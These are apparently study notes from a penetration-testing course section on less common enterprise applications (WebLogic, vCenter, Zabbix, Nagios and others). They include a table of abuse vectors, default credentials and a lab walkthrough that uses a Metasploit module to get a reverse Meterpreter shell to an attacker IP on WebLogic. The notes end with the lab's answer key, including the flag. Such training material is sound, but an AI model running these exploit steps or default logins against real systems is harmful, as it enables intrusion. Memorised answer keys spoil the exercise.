## ID
706

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 29 — Other Notable Applications

## Description
Provides a reference table of additional enterprise applications commonly found during pentests (WebLogic, vCenter, Zabbix, etc.) with their abuse vectors, and demonstrates identifying and exploiting Oracle WebLogic via Nmap and Metasploit.

## Tags
weblogic, vcenter, zabbix, nagios, enumeration, metasploit, methodology

## Commands
- nmap -A -Pn <TARGET_IP>
- msfconsole -q
- use multi/http/weblogic_admin_handle_rce
- set RHOSTS <TARGET_IP>
- set SRVHOST <ATTACKER_IP>
- set LHOST <ATTACKER_IP>
- exploit
- cat C:/Users/Administrator/Desktop/flag.txt

## What This Section Covers
A methodology recap emphasizing that the techniques taught throughout the module (fingerprinting, default credentials, built-in functionality abuse, public exploits) apply universally to any application encountered during an assessment. The section provides a reference table of "honorable mention" applications commonly found in enterprise networks, each with specific abuse vectors. The lab demonstrates this methodology against Oracle WebLogic.

## Honorable Mentions Reference Table
- **Axis2** — Often sits on top of Tomcat; check for weak/default admin creds, upload webshell as AAR file (Axis2 service file); Metasploit module available
- **WebSphere** — Default creds `system:manager` for admin console; deploy WAR file for RCE (similar to Tomcat)
- **Elasticsearch** — Many historical vulnerabilities; often found on forgotten installs buried in large EyeWitness reports
- **Zabbix** — Open-source monitoring; vulns include SQLi, auth bypass, stored XSS, LDAP password disclosure, RCE; built-in API functionality can be abused for RCE
- **Nagios** — Network monitoring; default creds `nagiosadmin:PASSW0RD`; vulns include RCE, root privesc, SQLi, code injection, stored XSS
- **WebLogic** — Java EE app server; 190+ CVEs; many unauthenticated RCE exploits (2007–2021), primarily Java deserialization vulns
- **Wikis/Intranets** — MediaWiki, SharePoint, custom intranets; search functionality often exposes credentials in document repositories
- **DotNetNuke (DNN)** — Open-source CMS in C#/.NET; vulns include auth bypass, directory traversal, stored XSS, file upload bypass, arbitrary file download
- **vCenter** — Manages ESXi instances; check for weak creds and Apache Struts 2 RCE (scanners miss this); CVE-2021-22005 unauthenticated OVA upload; Windows appliance often runs as SYSTEM or even domain admin — privesc via JuicyPotato

## Methodology
1. Run an aggressive Nmap scan: `nmap -A -Pn <TARGET_IP>` and identify the application from service banners and version info
2. Cross-reference discovered applications against the honorable mentions table and known CVE databases
3. For WebLogic (port 7001, T3 protocol): launch Metasploit with `use multi/http/weblogic_admin_handle_rce`
4. Configure: set `RHOSTS` (target), `SRVHOST` and `LHOST` (attacker IP)
5. Run `exploit` — the module checks for path traversal vulnerability, then deploys a PowerShell stager for a Meterpreter session
6. Read target files: `cat C:/Users/Administrator/Desktop/flag.txt`

## Key Takeaways
- The methodology is universal: fingerprint → check default creds → enumerate built-in functionality → search for public exploits — this works regardless of the specific application
- Don't get discouraged by large scan outputs (500+ page EyeWitness reports) — filter the noise and look for forgotten installs with default credentials
- WebLogic runs on port 7001 and is identifiable by Nmap's T3 protocol detection (`weblogic-t3-info`)
- vCenter is high-value: often runs as SYSTEM or domain admin, making it both a foothold and a potential single point of full compromise
- Default credentials are still one of the most common attack vectors across enterprise applications (`system:manager`, `nagiosadmin:PASSW0RD`, etc.)
- Scanners like Nessus miss certain vulnerabilities (e.g., vCenter Struts 2 RCE) — manual testing and methodology fill the gaps

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| What application is running? | WebLogic | Nmap `-A` scan showing port 7001 with T3 protocol and version 12.2.1.3 |
| Submit the contents of flag.txt | w3b_l0gic_RCE! | `cat C:/Users/Administrator/Desktop/flag.txt` via Meterpreter session from `weblogic_admin_handle_rce` |
